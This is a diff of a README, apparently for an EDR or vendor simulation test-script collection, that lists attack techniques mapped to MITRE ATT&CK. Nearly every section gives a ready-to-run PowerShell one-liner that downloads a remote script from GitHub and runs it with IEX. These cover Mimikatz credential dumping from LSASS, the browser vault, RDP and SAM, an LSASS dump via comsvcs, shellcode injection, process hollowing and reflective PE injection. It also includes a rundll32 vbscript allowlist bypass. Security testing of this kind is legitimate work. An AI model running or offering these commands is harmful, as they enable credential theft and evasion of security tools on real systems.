@@ -55,20 +55,20 @@ A more evasive variant that also identifies AmsiScanBuffer function through a me
 Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system,depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
 https://attack.mitre.org/techniques/T1555/
 
-### Lsass logon passwords
+### 1. Lsass logon passwords
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`
 
-### Browser Vault credential theft
+### 2. Browser Vault credential theft
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`
 
-### Remote Desktop credentials theft
+### 3. Remote Desktop credentials theft
 Recently was added to Mimikatz, the assumption is that the target commputer connects through RDP to some other computer at the moment of theft of those credentials. 
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "ts::mstsc"`
 
-### Security Account Manager credentials theft
+### 4. Security Account Manager credentials theft
 Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.
 Enumerating the SAM database requires SYSTEM level access - you need to execute powershell as administrator - the mimikatz command already tries to elevate to system.
 https://attack.mitre.org/techniques/T1003/002/
@@ -81,7 +81,7 @@ As well as in-memory techniques, the LSASS process memory can be dumped from the
 
 https://attack.mitre.org/techniques/T1003/001/
 
-### Comsvcs lsass dump 
+### 1. Comsvcs lsass dump 
 Built-in Windows tools such as comsvcs.dll can be used to dump lsass
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-LsassDump1.ps1"); Invoke-LsassDump1;`
@@ -91,7 +91,7 @@ Adversaries may inject code into processes in order to evade process-based defen
 
 https://attack.mitre.org/techniques/T1055/
 
-### Shellcode Entry Injection
+### 1. Shellcode Entry Injection
 Injection of shellcode into the entry of a legitimate spawn process
 In this example we will inject shellcode into notepad that spawns calculator
 
@@ -99,7 +99,7 @@ In this example we will inject shellcode into notepad that spawns calculator
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
 
-### Shellcode Import Address Table Execution
+### 2. Shellcode Import Address Table Execution
 Iteration through process environment block while searching ntdll "openprocess" system call from within the import of kernelbase.dll (legitimate core dll)
 
 ** Unfortunately MITRE doesn't have a technique mapping to shellcode execution, nevertheless its one of the popular evasion techniques **
@@ -107,7 +107,7 @@ Iteration through process environment block while searching ntdll "openprocess" 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-IAT-Shellcode.ps1"); Invoke-IAT-Shellcode;`
 
 
-### Hollowing
+### 3. Hollowing
 Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
 Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz process 
 
@@ -115,7 +115,7 @@ https://attack.mitre.org/techniques/T1055/012/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;`
 
-### Reflective PE Injection
+### 4. Reflective PE Injection
 In this example we will reflectively load a simple MsgBox dll within a remote process (the dll is 64bit), 
 Reflective loading allows to load a full executable in a legitimate application while bypassing image load monitoring
 This also allows to load executable that is not on the disk. We will use the known PowerSploit PE injection.
@@ -124,7 +124,7 @@ https://attack.mitre.org/techniques/T1620/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ReflectivePEInjection.ps1"); Invoke-ReflectivePEInjection -ProcName explorer;`
 
-### RunPE Injection
+### 5. RunPE Injection
 Similar to Process hollowing with one very important difference, the injection of the executable is done locally within the same process while bypassing EDR solutions,
 Many times implemented as part of advanced malwares such as RAT to evade detection and as part of custom packer.
 
@@ -136,7 +136,7 @@ https://attack.mitre.org/techniques/T1620/
 ## Allowlist Bypass (formerly Whitelist bypass)
 "Living-off-the-land" techniques that can be used to bypass Application Whitelisting Protection, usually maintain stealthiness and evasion by abusing inherent architectural weakness of the operating system.
 
-### Rundll32 RunHTMLApplication 
+### 1. Rundll32 RunHTMLApplication 
 
 Adversaries abuse Rundll32 to execute JavaScript and VBScript codes without downloading scripts.
 Due to architectural weakness within the rundll32 loading process, rundll32 can be misused to not only load DLLs, but also to execute a direct Javascript or VBScript code.
@@ -147,7 +147,7 @@ https://attack.mitre.org/techniques/T1218/011/
 
 `CMD> rundll32.exe vbscript:"\..\\mshtml, RunHTMLApplication "+Close(CreateObject("WScript.Shell").Run("calc"))`
 
-### Regsvr32 "Squiblydoo" 
+### 2. Regsvr32 "Squiblydoo" 
  Regsvr32.exe (Microsoft signed binary) can be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web Server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique  is often referred to as "Squiblydoo" attack and has been used in campaigns targeting governments.
 
 https://attack.mitre.org/techniques/T1218/010/
